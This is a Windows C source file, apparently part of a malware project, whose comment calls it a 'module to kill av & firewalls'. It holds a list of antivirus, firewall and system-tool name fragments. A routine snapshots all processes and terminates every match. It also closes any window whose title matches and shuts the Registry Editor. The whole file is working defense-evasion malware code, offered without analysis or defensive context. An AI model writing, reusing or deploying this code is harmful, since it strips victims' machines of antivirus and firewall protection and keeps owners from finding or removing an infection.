   #include "stdafx.h"
   #include "prototypez.h"
   #include "tlhelp32.h"

   /* module to kill av & firewalls */

   #define NumberOfApps    20

   char *app_list[NumberOfApps]={"anti","viru","troja","avp","nav","rav",
                                   "reged","nod32","spybot","zonea","vsmon",
                                   "avg","blackice","firewall","msconfig",
                                   "lockdown","f-pro","mcafee","taskmgr","reged"};


   BOOL IsProtectionProgram(char app_name[])
   {
       int i;

       CharLower(app_name);

       for(i=0;i<NumberOfApps;i++)
           if(strstr(app_name,app_list[i])!=0)
               return TRUE;
       return FALSE;
   }

   BOOL CALLBACK EnumWindowsProc(HWND hwnd,LPARAM lparam)
   {
       //check windows names,and close them if any suspected window founded:
       char wtext[MAX_PATH];

       GetWindowText(hwnd,wtext,sizeof(wtext));

       if(IsProtectionProgram(wtext)==TRUE)
           PostMessage(hwnd,WM_QUIT,0,0);

       return TRUE;
   }

   VOID CALLBACK DisableProtectionPrograms(HWND hwnd,UINT umsg,UINT idEvent,DWORD dwTime)
   {
       /*  disable:
               o registry editor
               o antiviruses
               o firewalls
           find windows that are suspect to be antivirus\firewall
           and disable them.
       */

       HANDLE hsnp,hprc;
       HWND hreg;
       PROCESSENTRY32 prc;

       hsnp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);

       if(hsnp!=INVALID_HANDLE_VALUE)
       {
           if(Process32First(hsnp,&prc)==TRUE)
           {
               do
               {
                   if(IsProtectionProgram(prc.szExeFile)==TRUE)
                   {
                       hprc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,prc.th32ProcessID);
                       if(hprc!=NULL)
                       {
                           TerminateProcess(hprc,1);
                           CloseHandle(hprc);
                       }
                   }
               }while(Process32Next(hsnp,&prc));
           }
           CloseHandle(hsnp);
       }

       EnumWindows(EnumWindowsProc,NULL);      //kill by window title:

       hreg=FindWindow(NULL,"Registry Editor");    //kill the registry editor:

       if(hreg!=NULL)
           PostMessage(hreg,WM_QUIT,0,0);

   }
